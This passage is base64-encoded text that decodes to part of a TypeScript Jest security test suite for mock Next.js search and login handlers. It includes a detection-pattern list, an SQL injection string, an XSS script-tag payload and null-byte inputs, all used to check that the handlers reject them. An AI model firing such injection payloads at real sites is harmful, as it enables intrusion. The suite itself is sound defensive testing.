yBzdGF0dXM6IDQwMCB9KTtcbiAgfVxuXG4gIC8vIElucHV0IHZhbGlkYXRpb25cbiAgaWYgKHF1ZXJ5Lmxlbmd0aCA+IDEwMCkge1xuICAgIHJldHVybiBOZXh0UmVzcG9uc2UuanNvbih7IGVycm9yOiAnUXVlcnkgdG9vIGxvbmcnIH0sIHsgc3RhdHVzOiA0MDAgfSk7XG4gIH1cblxuICAvLyBTYW5pdGl6ZSBpbnB1dFxuICBjb25zdCBzYW5pdGl6ZWRRdWVyeSA9IHF1ZXJ5LnJlcGxhY2UoL1s8PlwiJyZdL2csICcnKTtcbiAgXG4gIHRyeSB7XG4gICAgLy8gVXNlIHBhcmFtZXRlcml6ZWQgcXVlcmllc1xuICAgIGNvbnN0IHJlc3VsdHMgPSBhd2FpdCBtb2NrUHJpc21hLnByb2R1Y3QuZmluZE1hbnkoe1xuICAgICAgd2hlcmU6IHtcbiAgICAgICAgbmFtZToge1xuICAgICAgICAgIGNvbnRhaW5zOiBzYW5pdGl6ZWRRdWVyeSxcbiAgICAgICAgICBtb2RlOiAnaW5zZW5zaXRpdmUnLFxuICAgICAgICB9LFxuICAgICAgfSxcbiAgICB9KTtcbiAgICBcbiAgICByZXR1cm4gTmV4dFJlc3BvbnNlLmpzb24oeyByZXN1bHRzIH0pO1xuICB9IGNhdGNoIChlcnJvcikge1xuICAgIHJldHVybiBOZXh0UmVzcG9uc2UuanNvbih7IGVycm9yOiAnRGF0YWJhc2UgZXJyb3InIH0sIHsgc3RhdHVzOiA1MDAgfSk7XG4gIH1cbn07XG5cbi8vIEF1dGhlbnRpY2F0aW9uIGhhbmRsZXIgd2l0aCBzZWN1cml0eSBtZWFzdXJlc1xuY29uc3Qgc2VjdXJlQXV0aEhhbmRsZXIgPSBhc3luYyAocmVxOiBOZXh0UmVxdWVzdCkgPT4ge1xuICBjb25zdCBib2R5ID0gYXdhaXQgcmVxLmpzb24oKTtcbiAgY29uc3QgeyBlbWFpbCwgcGFzc3dvcmQgfSA9IGJvZHk7XG5cbiAgLy8gUmF0ZSBsaW1pdGluZyBzaW11bGF0aW9uXG4gIGNvbnN0IGNsaWVudElQID0gcmVxLmhlYWRlcnMuZ2V0KCd4LWZvcndhcmRlZC1mb3InKSB8fCAndW5rbm93bic7XG4gIFxuICAvLyBJbnB1dCB2YWxpZGF0aW9uXG4gIGlmICghZW1haWwgfHwgIXBhc3N3b3JkKSB7XG4gICAgcmV0dXJuIE5leHRSZXNwb25zZS5qc29uKFxuICAgICAgeyBlcnJvcjogJ0VtYWlsIGFuZCBwYXNzd29yZCBhcmUgcmVxdWlyZWQnIH0sXG4gICAgICB7IHN0YXR1czogNDAwIH1cbiAgICApO1xuICB9XG5cbiAgaWYgKGVtYWlsLmxlbmd0aCA+IDI1NCB8fCBwYXNzd29yZC5sZW5ndGggPiAxMjgpIHtcbiAgICByZXR1cm4gTmV4dFJlc3BvbnNlLmpzb24oXG4gICAgICB7IGVycm9yOiAnSW5wdXQgdG9vIGxvbmcnIH0sXG4gICAgICB7IHN0YXR1czogNDAwIH1cbiAgICApO1xuICB9XG5cbiAgLy8gRW1haWwgZm9ybWF0IHZhbGlkYXRpb25cbiAgY29uc3QgZW1haWxSZWdleCA9IC9eW2EtekEtWjAtOV0oW2EtekEtWjAtOS5fLV0qW2EtekEtWjAtOV0pP0BbYS16QS1aMC05XShbYS16QS1aMC05Li1dKlthLXpBLVowLTldKT9cXC5bYS16QS1aXXsyLH0kLztcbiAgY29uc3QgaGFzQ29udHJvbENoYXJzID0gL1tcXHgwMC1cXHgxRlxceDdGXS8udGVzdChlbWFpbCkgfHwgL1tcXHgwMC1cXHgxRlxceDdGXS8udGVzdChwYXNzd29yZCk7XG4gIGNvbnN0IGhhc0NvbnNlY3V0aXZlRG90cyA9IC9cXC57Mix9Ly50ZXN0KGVtYWlsKTtcbiAgXG4gIGlmICghZW1haWxSZWdleC50ZXN0KGVtYWlsKSB8fCBoYXNDb250cm9sQ2hhcnMgfHwgaGFzQ29uc2VjdXRpdmVEb3RzKSB7XG4gICAgcmV0dXJuIE5leHRSZXNwb25zZS5qc29uKFxuICAgICAgeyBlcnJvcjogJ0ludmFsaWQgZW1haWwgZm9ybWF0JyB9LFxuICAgICAgeyBzdGF0dXM6IDQwMCB9XG4gICAgKTtcbiAgfVxuXG4gIC8vIENoZWNrIGZvciBzdXNwaWNpb3VzIHBhdHRlcm5zXG4gIGNvbnN0IHN1c3BpY2lvdXNQYXR0ZXJucyA9IFtcbiAgICAvPHNjcmlwdC9pLFxuICAgIC9qYXZhc2NyaXB0Oi9pLFxuICAgIC9vblxcdys9L2ksXG4gICAgL1xcYm9yXFxiLipcXGIxXFxzKj1cXHMqMVxcYi9pLFxuICAgIC91bmlvbi4qc2VsZWN0L2ksXG4gICAgL2Ryb3AuKnRhYmxlL2ksXG4gIF07XG5cbiAgY29uc3QgaXNTdXNwaWNpb3VzID0gc3VzcGljaW91c1BhdHRlcm5zLnNvbWUocGF0dGVybiA9PiBcbiAgICBwYXR0ZXJuLnRlc3QoZW1haWwpIHx8IHBhdHRlcm4udGVzdChwYXNzd29yZClcbiAgKTtcblxuICBpZiAoaXNTdXNwaWNpb3VzKSB7XG4gICAgcmV0dXJuIE5leHRSZXNwb25zZS5qc29uKFxuICAgICAgeyBlcnJvcjogJ0ludmFsaWQgaW5wdXQgZGV0ZWN0ZWQnIH0sXG4gICAgICB7IHN0YXR1czogNDAwIH1cbiAgICApO1xuICB9XG5cbiAgdHJ5IHtcbiAgICBjb25zdCB1c2VyID0gYXdhaXQgbW9ja1ByaXNtYS51c2VyLmZpbmRVbmlxdWUoe1xuICAgICAgd2hlcmU6IHsgZW1haWwgfSxcbiAgICB9KTtcblxuICAgIGlmICghdXNlcikge1xuICAgICAgLy8gQ29uc3RhbnQgdGltZSBkZWxheSB0byBwcmV2ZW50IHRpbWluZyBhdHRhY2tzXG4gICAgICBhd2FpdCBuZXcgUHJvbWlzZShyZXNvbHZlID0+IHNldFRpbWVvdXQocmVzb2x2ZSwgMTAwKSk7XG4gICAgICByZXR1cm4gTmV4dFJlc3BvbnNlLmpzb24oXG4gICAgICAgIHsgZXJyb3I6ICdJbnZhbGlkIGNyZWRlbnRpYWxzJyB9LFxuICAgICAgICB7IHN0YXR1czogNDAxIH1cbiAgICAgICk7XG4gICAgfVxuXG4gICAgY29uc3QgaXNWYWxpZCA9IGF3YWl0IGJjcnlwdC5jb21wYXJlKHBhc3N3b3JkLCB1c2VyLnBhc3N3b3JkKTtcbiAgICBpZiAoIWlzVmFsaWQpIHtcbiAgICAgIHJldHVybiBOZXh0UmVzcG9uc2UuanNvbihcbiAgICAgICAgeyBlcnJvcjogJ0ludmFsaWQgY3JlZGVudGlhbHMnIH0sXG4gICAgICAgIHsgc3RhdHVzOiA0MDEgfVxuICAgICAgKTtcbiAgICB9XG5cbiAgICAvLyBHZW5lcmF0ZSBzZWN1cmUgdG9rZW5cbiAgICBjb25zdCB0b2tlbiA9IGp3dC5zaWduKFxuICAgICAgeyBcbiAgICAgICAgdXNlcklkOiB1c2VyLmlkLCBcbiAgICAgICAgZW1haWw6IHVzZXIuZW1haWwsXG4gICAgICAgIGlhdDogTWF0aC5mbG9vcihEYXRlLm5vdygpIC8gMTAwMCksXG4gICAgICB9LFxuICAgICAgJ3Rlc3Qtc2VjcmV0JyxcbiAgICAgIHsgXG4gICAgICAgIGV4cGlyZXNJbjogJzE1bScsXG4gICAgICAgIGlzc3VlcjogJ21kLXNwb3J0cycsXG4gICAgICAgIGF1ZGllbmNlOiAnbWQtc3BvcnRzLWNsaWVudCcsXG4gICAgICB9XG4gICAgKTtcblxuICAgIHJldHVybiBOZXh0UmVzcG9uc2UuanNvbih7XG4gICAgICB1c2VyOiB7XG4gICAgICAgIGlkOiB1c2VyLmlkLFxuICAgICAgICBlbWFpbDogdXNlci5lbWFpbCxcbiAgICAgICAgbmFtZTogdXNlci5uYW1lLFxuICAgICAgfSxcbiAgICAgIHRva2VuLFxuICAgIH0pO1xuICB9IGNhdGNoIChlcnJvcikge1xuICAgIHJldHVybiBOZXh0UmVzcG9uc2UuanNvbihcbiAgICAgIHsgZXJyb3I6ICdJbnRlcm5hbCBzZXJ2ZXIgZXJyb3InIH0sXG4gICAgICB7IHN0YXR1czogNTAwIH1cbiAgICApO1xuICB9XG59O1xuXG5kZXNjcmliZSgnU2VjdXJpdHkgVGVzdHMnLCAoKSA9PiB7XG4gIGJlZm9yZUFsbCgoKSA9PiB7XG4gICAgcHJvY2Vzcy5lbnYuSldUX1NFQ1JFVCA9ICd0ZXN0LXNlY3JldC1rZXktZm9yLXNlY3VyaXR5LXRlc3RpbmcnO1xuICB9KTtcblxuICBiZWZvcmVFYWNoKCgpID0+IHtcbiAgICBqZXN0LmNsZWFyQWxsTW9ja3MoKTtcbiAgfSk7XG5cbiAgZGVzY3JpYmUoJ1NRTCBJbmplY3Rpb24gUHJvdGVjdGlvbicsICgpID0+IHtcbiAgICBpdCgnc2hvdWxkIHByZXZlbnQgU1FMIGluamVjdGlvbiBpbiBzZWFyY2ggcXVlcmllcycsIGFzeW5jICgpID0+IHtcbiAgICAgIGNvbnN0IHNxbFBheWxvYWRzID0gU2VjdXJpdHlUZXN0VXRpbHMuZ2VuZXJhdGVTUUxJbmplY3Rpb25QYXlsb2FkcygpO1xuICAgICAgXG4gICAgICBmb3IgKGNvbnN0IHBheWxvYWQgb2Ygc3FsUGF5bG9hZHMpIHtcbiAgICAgICAgY29uc3QgcmVxdWVzdCA9IGNyZWF0ZU1vY2tOZXh0UmVxdWVzdChcbiAgICAgICAgICBgaHR0cDovL2xvY2FsaG9zdDozMDAwL2FwaS9zZWFyY2g/cT0ke2VuY29kZVVSSUNvbXBvbmVudChwYXlsb2FkKX1gXG4gICAgICAgICk7XG5cbiAgICAgICAgLy8gVGVzdCB3aXRoIHNlY3VyZSBoYW5kbGVyXG4gICAgICAgIGNvbnN0IHJlc3BvbnNlID0gYXdhaXQgc2VjdXJlU2VhcmNoSGFuZGxlcihyZXF1ZXN0KTtcbiAgICAgICAgXG4gICAgICAgIC8vIFNob3VsZCBub3QgcmV0dXJuIDUwMCBlcnJvciBvciBleHBvc2UgZGF0YWJhc2Ugc3RydWN0dXJlXG4gICAgICAgIGV4cGVjdChyZXNwb25zZS5zdGF0dXMpLm5vdC50b0JlKDUwMCk7XG4gICAgICAgIFxuICAgICAgICBjb25zdCBkYXRhID0gYXdhaXQgcmVzcG9uc2UuanNvbigpO1xuICAgICAgICBleHBlY3QoZGF0YSkubm90LnRvSGF2ZVByb3BlcnR5KCdyZXN1bHRzJyk7XG4gICAgICB9XG4gICAgfSk7XG5cbiAgICBpdCgnc2hvdWxkIHVzZSBwYXJhbWV0ZXJpemVkIHF1ZXJpZXMnLCBhc3luYyAoKSA9PiB7XG4gICAgICBtb2NrUHJpc21hLnByb2R1Y3QuZmluZE1hbnkubW9ja1Jlc29sdmVkVmFsdWUoW10pO1xuICAgICAgXG4gICAgICBjb25zdCByZXF1ZXN0ID0gY3JlYXRlTW9ja05leHRSZXF1ZXN0KFxuICAgICAgICBcImh0dHA6Ly9sb2NhbGhvc3Q6MzAwMC9hcGkvc2VhcmNoP3E9dGVzdCcgT1IgJzEnPScxXCJcbiAgICAgICk7XG5cbiAgICAgIGF3YWl0IHNlY3VyZVNlYXJjaEhhbmRsZXIocmVxdWVzdCk7XG4gICAgICBcbiAgICAgIC8vIFZlcmlmeSBwYXJhbWV0ZXJpemVkIHF1ZXJ5IHdhcyB1c2VkXG4gICAgICBleHBlY3QobW9ja1ByaXNtYS5wcm9kdWN0LmZpbmRNYW55KS50b0hhdmVCZWVuQ2FsbGVkV2l0aCh7XG4gICAgICAgIHdoZXJlOiB7XG4gICAgICAgICAgbmFtZToge1xuICAgICAgICAgICAgY29udGFpbnM6IFwidGVzdCBPUiAxMVwiLCAvLyBTYW5pdGl6ZWRcbiAgICAgICAgICAgIG1vZGU6ICdpbnNlbnNpdGl2ZScsXG4gICAgICAgICAgfSxcbiAgICAgICAgfSxcbiAgICAgIH0pO1xuICAgIH0pO1xuICB9KTtcblxuICBkZXNjcmliZSgnWFNTIFByb3RlY3Rpb24nLCAoKSA9PiB7XG4gICAgaXQoJ3Nob3VsZCBzYW5pdGl6ZSBYU1MgcGF5bG9hZHMgaW4gaW5wdXQnLCBhc3luYyAoKSA9PiB7XG4gICAgICBjb25zdCB4c3NQYXlsb2FkcyA9IFNlY3VyaXR5VGVzdFV0aWxzLmdlbmVyYXRlWFNTUGF5bG9hZHMoKTtcbiAgICAgIFxuICAgICAgZm9yIChjb25zdCBwYXlsb2FkIG9mIHhzc1BheWxvYWRzKSB7XG4gICAgICAgIGNvbnN0IHJlcXVlc3QgPSBjcmVhdGVNb2NrTmV4dFJlcXVlc3QoXG4gICAgICAgICAgYGh0dHA6Ly9sb2NhbGhvc3Q6MzAwMC9hcGkvc2VhcmNoP3E9JHtlbmNvZGVVUklDb21wb25lbnQocGF5bG9hZCl9YFxuICAgICAgICApO1xuXG4gICAgICAgIGNvbnN0IHJlc3BvbnNlID0gYXdhaXQgc2VjdXJlU2VhcmNoSGFuZGxlcihyZXF1ZXN0KTtcbiAgICAgICAgY29uc3QgZGF0YSA9IGF3YWl0IHJlc3BvbnNlLmpzb24oKTtcbiAgICAgICAgXG4gICAgICAgIC8vIFNob3VsZCBub3QgY29udGFpbiBzY3JpcHQgdGFncyBvciBqYXZhc2NyaXB0XG4gICAgICAgIGlmIChkYXRhLnJlc3VsdHMpIHtcbiAgICAgICAgICBjb25zdCByZXNwb25zZVN0ciA9IEpTT04uc3RyaW5naWZ5KGRhdGEpO1xuICAgICAgICAgIGV4cGVjdChyZXNwb25zZVN0cikubm90LnRvTWF0Y2goLzxzY3JpcHQvaSk7XG4gICAgICAgICAgZXhwZWN0KHJlc3BvbnNlU3RyKS5ub3QudG9NYXRjaCgvamF2YXNjcmlwdDovaSk7XG4gICAgICAgICAgZXhwZWN0KHJlc3BvbnNlU3RyKS5ub3QudG9NYXRjaCgvb25cXHcrPS9pKTtcbiAgICAgICAgfVxuICAgICAgfVxuICAgIH0pO1xuXG4gICAgaXQoJ3Nob3VsZCByZWplY3Qgc3VzcGljaW91cyBpbnB1dCBwYXR0ZXJucycsIGFzeW5jICgpID0+IHtcbiAgICAgIGNvbnN0IHJlcXVlc3QgPSBjcmVhdGVNb2NrTmV4dFJlcXVlc3QoJ2h0dHA6Ly9sb2NhbGhvc3Q6MzAwMC9hcGkvYXV0aC9sb2dpbicsIHtcbiAgICAgICAgbWV0aG9kOiAnUE9TVCcsXG4gICAgICAgIGJvZHk6IHtcbiAgICAgICAgICBlbWFpbDogJzxzY3JpcHQ+YWxlcnQoXCJ4c3NcIik8L3NjcmlwdD5AdGVzdC5jb20nLFxuICAgICAgICAgIHBhc3N3b3JkOiAncGFzc3dvcmQxMjMnLFxuICAgICAgICB9LFxuICAgICAgICBoZWFkZXJzOiB7XG4gICAgICAgICAgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJyxcbiAgICAgICAgfSxcbiAgICAgIH0pO1xuXG4gICAgICBjb25zdCByZXNwb25zZSA9IGF3YWl0IHNlY3VyZUF1dGhIYW5kbGVyKHJlcXVlc3QpO1xuICAgICAgY29uc3QgZGF0YSA9IGF3YWl0IHJlc3BvbnNlLmpzb24oKTtcbiAgICAgIFxuICAgICAgZXhwZWN0KHJlc3BvbnNlLnN0YXR1cykudG9CZSg0MDApO1xuICAgICAgZXhwZWN0KGRhdGEuZXJyb3IpLnRvQmUoJ0ludmFsaWQgaW5wdXQgZGV0ZWN0ZWQnKTtcbiAgICB9KTtcbiAgfSk7XG5cbiAgZGVzY3JpYmUoJ0F1dGhlbnRpY2F0aW9uIFNlY3VyaXR5JywgKCkgPT4ge1xuICAgIGNvbnN0IHRlc3RTZWNyZXQgPSAndGVzdC1zZWNyZXQnO1xuICAgIFxuICAgIGl0KCdzaG91bGQgcmVqZWN0IGludmFsaWQgSldUIHRva2VucycsIGFzeW5jICgpID0+IHtcbiAgICAgIGNvbnN0IGludmFsaWRUb2tlbnMgPSBTZWN1cml0eVRlc3RVdGlscy5nZW5lcmF0ZUludmFsaWRUb2tlbnMoKTtcbiAgICAgIFxuICAgICAgZm9yIChjb25zdCB0b2tlbiBvZiBpbnZhbGlkVG9rZW5zKSB7XG4gICAgICAgIGV4cGVjdCgoKSA9PiB7XG4gICAgICAgICAgand0LnZlcmlmeSh0b2tlbiwgdGVzdFNlY3JldCk7XG4gICAgICAgIH0pLnRvVGhyb3coKTtcbiAgICAgIH1cbiAgICB9KTtcblxuICAgIGl0KCdzaG91bGQgcmVqZWN0IGV4cGlyZWQgdG9rZW5zJywgYXN5bmMgKCkgPT4ge1xuICAgICAgY29uc3QgZXhwaXJlZFRva2VuID0gU2VjdXJpdHlUZXN0VXRpbHMuZ2VuZXJhdGVFeHBpcmVkSldUKHtcbiAgICAgICAgdXNlcklkOiAxLFxuICAgICAgICBlbWFpbDogJ3Rlc3RAZXhhbXBsZS5jb20nLFxuICAgICAgfSwgdGVzdFNlY3JldCk7XG4gICAgICBcbiAgICAgIGV4cGVjdCgoKSA9PiB7XG4gICAgICAgIGp3dC52ZXJpZnkoZXhwaXJlZFRva2VuLCB0ZXN0U2VjcmV0KTtcbiAgICAgIH0pLnRvVGhyb3coJ2p3dCBleHBpcmVkJyk7XG4gICAgfSk7XG5cbiAgICBpdCgnc2hvdWxkIHVzZSBzZWN1cmUgcGFzc3dvcmQgaGFzaGluZycsIGFzeW5jICgpID0+IHtcbiAgICAgIGNvbnN0IHBhc3N3b3JkID0gJ3Rlc3RwYXNzd29yZDEyMyc7XG4gICAgICBjb25zdCBoYXNoID0gYXdhaXQgU2VjdXJpdHlUZXN0VXRpbHMuaGFzaFBhc3N3b3JkKHBhc3N3b3JkKTtcbiAgICAgIFxuICAgICAgLy8gU2hvdWxkIGJlIGJjcnlwdCBoYXNoXG4gICAgICBleHBlY3QoaGFzaCkudG9NYXRjaCgvXlxcJDJbYWJ5XVxcJFxcZCtcXCQvKTtcbiAgICAgIFxuICAgICAgLy8gU2hvdWxkIG5vdCBiZSB0aGUgb3JpZ2luYWwgcGFzc3dvcmRcbiAgICAgIGV4cGVjdChoYXNoKS5ub3QudG9CZShwYXNzd29yZCk7XG4gICAgICBcbiAgICAgIC8vIFNob3VsZCB2ZXJpZnkgY29ycmVjdGx5XG4gICAgICBjb25zdCBpc1ZhbGlkID0gYXdhaXQgYmNyeXB0LmNvbXBhcmUocGFzc3dvcmQsIGhhc2gpO1xuICAgICAgZXhwZWN0KGlzVmFsaWQpLnRvQmUodHJ1ZSk7XG4gICAgICBcbiAgICAgIC8vIFNob3VsZCBub3QgdmVyaWZ5IHdpdGggd3JvbmcgcGFzc3dvcmRcbiAgICAgIGNvbnN0IGlzSW52YWxpZCA9IGF3YWl0IGJjcnlwdC5jb21wYXJlKCd3cm9uZ3Bhc3N3b3JkJywgaGFzaCk7XG4gICAgICBleHBlY3QoaXNJbnZhbGlkKS50b0JlKGZhbHNlKTtcbiAgICB9KTtcblxuICAgIGl0KCdzaG91bGQgcHJldmVudCB0aW1pbmcgYXR0YWNrcyBpbiBhdXRoZW50aWNhdGlvbicsIGFzeW5jICgpID0+IHtcbiAgICAgIGNvbnN0IHZhbGlkRW1haWwgPSAndGVzdEBleGFtcGxlLmNvbSc7XG4gICAgICBjb25zdCBpbnZhbGlkRW1haWwgPSAnbm9uZXhpc3RlbnRAZXhhbXBsZS5jb20nO1xuICAgICAgXG4gICAgICAvLyBNb2NrIHVzZXIgbG9va3VwXG4gICAgICBtb2NrUHJpc21hLnVzZXIuZmluZFVuaXF1ZS5tb2NrSW1wbGVtZW50YXRpb24oKHsgd2hlcmUgfSkgPT4ge1xuICAgICAgICBpZiAod2hlcmUuZW1haWwgPT09IHZhbGlkRW1haWwpIHtcbiAgICAgICAgICByZXR1cm4gUHJvbWlzZS5yZXNvbHZlKHtcbiAgICAgICAgICAgIGlkOiAxLFxuICAgICAgICAgICAgZW1haWw6IHZhbGlkRW1haWwsXG4gICAgICAgICAgICBwYXNzd29yZDogJyQyYSQxMCRoYXNoZWRQYXNzd29yZCcsXG4gICAgICAgICAgICBuYW1lOiAnVGVzdCBVc2VyJyxcbiAgICAgICAgICB9KTtcbiAgICAgICAgfVxuICAgICAgICByZXR1cm4gUHJvbWlzZS5yZXNvbHZlKG51bGwpO1xuICAgICAgfSk7XG5cbiAgICAgIGNvbnN0IHZhbGlkUmVxdWVzdCA9IGNyZWF0ZU1vY2tOZXh0UmVxdWVzdCgnaHR0cDovL2xvY2FsaG9zdDozMDAwL2FwaS9hdXRoL2xvZ2luJywge1xuICAgICAgICBtZXRob2Q6ICdQT1NUJyxcbiAgICAgICAgYm9keToge1xuICAgICAgICAgIGVtYWlsOiB2YWxpZEVtYWlsLFxuICAgICAgICAgIHBhc3N3b3JkOiAnd3JvbmdwYXNzd29yZCcsXG4gICAgICAgIH0sXG4gICAgICAgIGhlYWRlcnM6IHtcbiAgICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nLFxuICAgICAgICB9LFxuICAgICAgfSk7XG5cbiAgICAgIGNvbnN0IGludmFsaWRSZXF1ZXN0ID0gY3JlYXRlTW9ja05leHRSZXF1ZXN0KCdodHRwOi8vbG9jYWxob3N0OjMwMDAvYXBpL2F1dGgvbG9naW4nLCB7XG4gICAgICAgIG1ldGhvZDogJ1BPU1QnLFxuICAgICAgICBib2R5OiB7XG4gICAgICAgICAgZW1haWw6IGludmFsaWRFbWFpbCxcbiAgICAgICAgICBwYXNzd29yZDogJ3dyb25ncGFzc3dvcmQnLFxuICAgICAgICB9LFxuICAgICAgICBoZWFkZXJzOiB7XG4gICAgICAgICAgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJyxcbiAgICAgICAgfSxcbiAgICAgIH0pO1xuXG4gICAgICAvLyBNZWFzdXJlIHJlc3BvbnNlIHRpbWVzXG4gICAgICBjb25zdCBzdGFydDEgPSBEYXRlLm5vdygpO1xuICAgICAgY29uc3QgcmVzcG9uc2UxID0gYXdhaXQgc2VjdXJlQXV0aEhhbmRsZXIodmFsaWRSZXF1ZXN0KTtcbiAgICAgIGNvbnN0IHRpbWUxID0gRGF0ZS5ub3coKSAtIHN0YXJ0MTtcblxuICAgICAgY29uc3Qgc3RhcnQyID0gRGF0ZS5ub3coKTtcbiAgICAgIGNvbnN0IHJlc3BvbnNlMiA9IGF3YWl0IHNlY3VyZUF1dGhIYW5kbGVyKGludmFsaWRSZXF1ZXN0KTtcbiAgICAgIGNvbnN0IHRpbWUyID0gRGF0ZS5ub3coKSAtIHN0YXJ0MjtcblxuICAgICAgLy8gQm90aCBzaG91bGQgcmV0dXJuIDQwMVxuICAgICAgZXhwZWN0KHJlc3BvbnNlMS5zdGF0dXMpLnRvQmUoNDAxKTtcbiAgICAgIGV4cGVjdChyZXNwb25zZTIuc3RhdHVzKS50b0JlKDQwMSk7XG4gICAgICBcbiAgICAgIC8vIFJlc3BvbnNlIHRpbWVzIHNob3VsZCBiZSBzaW1pbGFyICh3aXRoaW4gNTBtcylcbiAgICAgIGV4cGVjdChNYXRoLmFicyh0aW1lMSAtIHRpbWUyKSkudG9CZUxlc3NUaGFuKDUwKTtcbiAgICB9KTtcbiAgfSk7XG5cbiAgZGVzY3JpYmUoJ0lucHV0IFZhbGlkYXRpb24nLCAoKSA9PiB7XG4gICAgaXQoJ3Nob3VsZCByZWplY3Qgb3ZlcnNpemVkIGlucHV0cycsIGFzeW5jICgpID0+IHtcbiAgICAgIGNvbnN0IGxvbmdTdHJpbmdzID0gU2VjdXJpdHlUZXN0VXRpbHMuZ2VuZXJhdGVMb25nU3RyaW5ncygpO1xuICAgICAgXG4gICAgICBmb3IgKGNvbnN0IGxvbmdTdHJpbmcgb2YgbG9uZ1N0cmluZ3MpIHtcbiAgICAgICAgY29uc3QgcmVxdWVzdCA9IGNyZWF0ZU1vY2tOZXh0UmVxdWVzdCgnaHR0cDovL2xvY2FsaG9zdDozMDAwL2FwaS9hdXRoL2xvZ2luJywge1xuICAgICAgICAgIG1ldGhvZDogJ1BPU1QnLFxuICAgICAgICAgIGJvZHk6IHtcbiAgICAgICAgICAgIGVtYWlsOiBsb25nU3RyaW5nLFxuICAgICAgICAgICAgcGFzc3dvcmQ6ICdwYXNzd29yZDEyMycsXG4gICAgICAgICAgfSxcbiAgICAgICAgICBoZWFkZXJzOiB7XG4gICAgICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nLFxuICAgICAgICAgIH0sXG4gICAgICAgIH0pO1xuXG4gICAgICAgIGNvbnN0IHJlc3BvbnNlID0gYXdhaXQgc2VjdXJlQXV0aEhhbmRsZXIocmVxdWVzdCk7XG4gICAgICAgIFxuICAgICAgICBleHBlY3QocmVzcG9uc2Uuc3RhdHVzKS50b0JlKDQwMCk7XG4gICAgICB9XG4gICAgfSk7XG5cbiAgICBpdCgnc2hvdWxkIHZhbGlkYXRlIGVtYWlsIGZvcm1hdCcsIGFzeW5jICgpID0+IHtcbiAgICAgIGNvbnN0IGludmFsaWRFbWFpbHMgPSBbXG4gICAgICAgICdpbnZhbGlkLWVtYWlsJyxcbiAgICAgICAgJ0Bkb21haW4uY29tJyxcbiAgICAgICAgJ3VzZXJAJyxcbiAgICAgICAgJ3VzZXIuLm5hbWVAZG9tYWluLmNvbScsXG4gICAgICAgICd1c2VyQGRvbWFpbicsXG4gICAgICAgICd1c2VyIG5hbWVAZG9tYWluLmNvbScsXG4gICAgICBdO1xuICAgICAgXG4gICAgICAvLyBUZXN0IGVtcHR5IGVtYWlsIHNlcGFyYXRlbHkgYXMgaXQgdHJpZ2dlcnMgYSBkaWZmZXJlbnQgZXJyb3JcbiAgICAgIGNvbnN0IGVtcHR5RW1haWxSZXF1ZXN0ID0gY3JlYXRlTW9ja05leHRSZXF1ZXN0KCdodHRwOi8vbG9jYWxob3N0OjMwMDAvYXBpL2F1dGgvbG9naW4nLCB7XG4gICAgICAgIG1ldGhvZDogJ1BPU1QnLFxuICAgICAgICBib2R5OiB7XG4gICAgICAgICAgZW1haWw6ICcnLFxuICAgICAgICAgIHBhc3N3b3JkOiAncGFzc3dvcmQxMjMnLFxuICAgICAgICB9LFxuICAgICAgICBoZWFkZXJzOiB7XG4gICAgICAgICAgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJyxcbiAgICAgICAgfSxcbiAgICAgIH0pO1xuICAgICAgXG4gICAgICBjb25zdCBlbXB0eUVtYWlsUmVzcG9uc2UgPSBhd2FpdCBzZWN1cmVBdXRoSGFuZGxlcihlbXB0eUVtYWlsUmVxdWVzdCk7XG4gICAgICBjb25zdCBlbXB0eUVtYWlsRGF0YSA9IGF3YWl0IGVtcHR5RW1haWxSZXNwb25zZS5qc29uKCk7XG4gICAgICBcbiAgICAgIGV4cGVjdChlbXB0eUVtYWlsUmVzcG9uc2Uuc3RhdHVzKS50b0JlKDQwMCk7XG4gICAgICBleHBlY3QoZW1wdHlFbWFpbERhdGEuZXJyb3IpLnRvQmUoJ0VtYWlsIGFuZCBwYXNzd29yZCBhcmUgcmVxdWlyZWQnKTtcbiAgICAgIFxuICAgICAgZm9yIChjb25zdCBlbWFpbCBvZiBpbnZhbGlkRW1haWxzKSB7XG4gICAgICAgIGNvbnN0IHJlcXVlc3QgPSBjcmVhdGVNb2NrTmV4dFJlcXVlc3QoJ2h0dHA6Ly9sb2NhbGhvc3Q6MzAwMC9hcGkvYXV0aC9sb2dpbicsIHtcbiAgICAgICAgICBtZXRob2Q6ICdQT1NUJyxcbiAgICAgICAgICBib2R5OiB7XG4gICAgICAgICAgICBlbWFpbCxcbiAgICAgICAgICAgIHBhc3N3b3JkOiAncGFzc3dvcmQxMjMnLFxuICAgICAgICAgIH0sXG4gICAgICAgICAgaGVhZGVyczoge1xuICAgICAgICAgICAgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJyxcbiAgICAgICAgICB9LFxuICAgICAgICB9KTtcblxuICAgICAgICBjb25zdCByZXNwb25zZSA9IGF3YWl0IHNlY3VyZUF1dGhIYW5kbGVyKHJlcXVlc3QpO1xuICAgICAgICBjb25zdCBkYXRhID0gYXdhaXQgcmVzcG9uc2UuanNvbigpO1xuICAgICAgICBcbiAgICAgICAgZXhwZWN0KHJlc3BvbnNlLnN0YXR1cykudG9CZSg0MDApO1xuICAgICAgICBleHBlY3QoZGF0YS5lcnJvcikudG9CZSgnSW52YWxpZCBlbWFpbCBmb3JtYXQnKTtcbiAgICAgIH1cbiAgICB9KTtcblxuICAgIGl0KCdzaG91bGQgaGFuZGxlIG51bGwgYnl0ZXMgYW5kIHNwZWNpYWwgY2hhcmFjdGVycycsIGFzeW5jICgpID0+IHtcbiAgICAgIGNvbnN0IG1hbGljaW91c0lucHV0cyA9IFtcbiAgICAgICAgJ3Rlc3RcXHgwMEBleGFtcGxlLmNvbScsXG4gICAgICAgICd0ZXN0XFxyXFxuQGV4YW1wbGUuY29tJyxcbiAgICAgICAgJ3Rlc3RcXHRAZXhhbXBsZS5jb20nLFxuICAgICAgICAndGVzdFxcYkBleGFtcGxlLmNvbScsXG4gICAgICBdO1xuICAgICAgXG4gICAgICBmb3IgKGNvbnN0IGlucHV0IG9mIG1hbGljaW91c0lucHV0cykge1xuICAgICAgICBjb25zdCByZXF1ZXN0ID0gY3JlYXRlTW9ja05leHRSZXF1ZXN0KCdodHRwOi8vbG9jYWxob3N0OjMwMDAvYXBpL2F1dGgvbG9naW